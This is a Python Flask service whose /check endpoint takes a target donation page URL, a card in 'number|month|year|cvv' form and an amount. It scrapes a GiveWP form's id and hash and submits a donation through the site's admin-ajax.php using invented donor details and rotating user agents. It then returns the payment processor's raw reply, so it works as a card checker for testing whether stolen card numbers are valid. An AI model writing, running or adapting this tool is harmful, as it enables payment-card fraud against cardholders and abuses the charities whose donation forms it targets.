from flask import Flask, request, Response
import requests
from bs4 import BeautifulSoup
import random
import time
import os

app = Flask(__name__)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Linux; Android 11)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
]

def get_headers(url):
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": url.split("/give")[0],
        "Referer": url
    }

@app.route("/check", methods=["GET"])
def check():
    url = request.args.get("url")
    card = request.args.get("card")
    amount = request.args.get("amount")

    if not url or not card or not amount:
        return Response("Missing params", status=400)

    try:
        number, month, year, cvv = card.split("|")

        session = requests.Session()
        headers = get_headers(url)

        for attempt in range(2):
            try:
                page = session.get(url, headers=headers, timeout=15)
                soup = BeautifulSoup(page.text, "html.parser")

                form_id = soup.find("input", {"name": "give-form-id"}).get("value")
                form_hash = soup.find("input", {"name": "give-form-hash"}).get("value")

                email = f"user{random.randint(1000,9999)}@mail.com"

                payload = {
                    "action": "give_process_donation",
                    "give-form-id": form_id,
                    "give-form-hash": form_hash,
                    "give-amount": amount,
                    "give_first": "John",
                    "give_last": "Doe",
                    "give_email": email,
                    "give_address_1": "Street 1",
                    "give_city": "NY",
                    "give_state": "NY",
                    "give_zip": "10001",
                    "give_country": "US",
                    "card_number": number,
                    "card_exp_month": month,
                    "card_exp_year": year,
                    "card_cvc": cvv
                }

                ajax_url = url.split("/give")[0] + "/wp-admin/admin-ajax.php"

                resp = session.post(
                    ajax_url,
                    data=payload,
                    headers=headers,
                    timeout=15
                )

                # 🔥 رجّع الرد زي ما هو بدون أي تعديل
                return Response(
                    resp.text,
                    status=resp.status_code,
                    content_type=resp.headers.get("Content-Type", "text/plain")
                )

            except Exception:
                time.sleep(1)

        return Response("Request failed after retry", status=500)

    except Exception as e:
        return Response(str(e), status=500)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
